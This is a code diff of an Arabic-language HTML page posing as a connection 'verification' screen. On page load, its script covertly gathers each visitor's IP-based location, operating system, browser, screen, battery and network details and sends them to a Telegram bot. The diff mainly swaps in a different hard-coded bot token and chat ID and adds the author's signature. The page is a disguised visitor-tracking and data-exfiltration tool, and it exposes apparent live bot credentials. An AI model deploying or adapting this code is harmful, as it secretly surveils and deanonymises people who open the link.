@@ -4,110 +4,82 @@
   <meta charset="UTF-8">
   <title>جارٍ التحقق...</title>
   <style>
-    body {
-      background-color: #f4f4f4;
-      font-family: 'Cairo', sans-serif;
-      text-align: center;
-      padding-top: 20%;
-      color: #333;
-    }
-    .loading {
-      font-size: 1.2em;
-    }
+    body { font-family: sans-serif; text-align: center; margin-top: 20%; color: #333; }
   </style>
 </head>
 <body>
   <h2>📡 يتم التحقق من اتصالك...</h2>
-  <div class="loading">يرجى الانتظار قليلاً...</div>
 
   <script>
+    const token ="7838376918:AAFWEO4aYThyO-bxv3HZFkgrXmO4DlSiCSs"; // ← استبدله بتوكن البوت
+    const chatId = "5192933654"; // ← استبدله بـ ID الخاص بك
+
     async function getIPInfo() {
-      const res = await fetch("https://ipapi.co/json/");
-      return await res.json();
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch {
+        return {};
+      }
     }
 
     async function getBatteryInfo() {
-      if ('getBattery' in navigator) {
+      try {
         const battery = await navigator.getBattery();
         return {
-          level: Math.round(battery.level * 100),
+          level: `${Math.round(battery.level * 100)}%`,
           charging: battery.charging ? "نعم" : "لا"
         };
+      } catch {
+        return { level: "غير متاح", charging: "غير معروف" };
       }
-      return { level: "غير متاح", charging: "غير متاح" };
     }
 
-    async function collectData() {
+    async function collectAndSend() {
       const ip = await getIPInfo();
       const battery = await getBatteryInfo();
       const connection = navigator.connection || {};
-      const time = new Date().toLocaleString('ar-YE');
+      const now = new Date();
 
-      return {
-        ip: ip.ip,
-        country: ip.country_name,
-        city: ip.city,
-        region: ip.region,
-        timezone: ip.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
-        time: time,
-        os: navigator.platform,
-        browser: navigator.userAgent,
-        language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? "مظلم" : "فاتح",
-        battery: battery.level + "%",
-        charging: battery.charging,
-        connection: connection.effectiveType || "غير معروف"
-      };
-    }
-
-    function formatMessage(data) {
-      return `📡 دخول جديد إلى الموقع:
+      const message = `
+📡 دخول جديد إلى الموقع:
 
 🧠 معلومات الزائر:
-🔹 IP: ${data.ip}
-🔹 الدولة: ${data.country}
-🔹 المدينة: ${data.city}, ${data.region}
-🔹 التوقيت المحلي: ${data.time}
-🔹 المنطقة الزمنية: ${data.timezone}
+🔹 IP: ${ip.ip || "?"}
+🔹 الدولة: ${ip.country_name || "?"}
+🔹 المدينة: ${ip.city || "?"}, ${ip.region || "?"}
+🔹 التوقيت المحلي: ${now.toLocaleString()}
+🔹 المنطقة الزمنية: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
 
 🖥️ الجهاز والمتصفح:
-🔸 نظام التشغيل: ${data.os}
-🔸 المتصفح: ${data.browser}
-🔸 اللغة: ${data.language}
-🔸 دقة الشاشة: ${data.screen}
-🔸 الوضع: ${data.theme}
+🔸 نظام التشغيل: ${navigator.platform}
+🔸 المتصفح: ${navigator.userAgent}
+🔸 اللغة: ${navigator.language}
+🔸 دقة الشاشة: ${screen.width}x${screen.height}
+🔸 الوضع: ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "مظلم" : "فاتح"}
 
 🔋 البطارية:
-🔸 الشحن: ${data.battery}
-🔸 موصل بالكهرباء: ${data.charging}
+🔸 الشحن: ${battery.level}
+🔸 موصل بالكهرباء: ${battery.charging}
 
 📶 الاتصال:
-🔸 نوع الاتصال: ${data.connection}
+🔸 نوع الاتصال: ${connection.effectiveType || "غير معروف"}
 
-⚠️ البيانات أُرسلت من خلال الصفحة المخصصة للزوار الجدد.
+⚠️   معا تحيات أبــو ؏ــࢪيـڜ البيانات أُرسلت تلقائيًا.
 ------------------------`;
-    }
 
-    async function sendToTelegram(msg) {
-      const chatId = new URLSearchParams(window.location.search).get("ref") || "7121448697"; // ← بدّله لو لزم الأمر
-      const token = "8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4"; // ← توكن البوت الخاص بك
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: msg
+          text: message
         })
       });
     }
 
-    (async () => {
-      const data = await collectData();
-      const msg = formatMessage(data);
-      await sendToTelegram(msg);
-    })();
+    collectAndSend();
   </script>
 </body>
 </html>
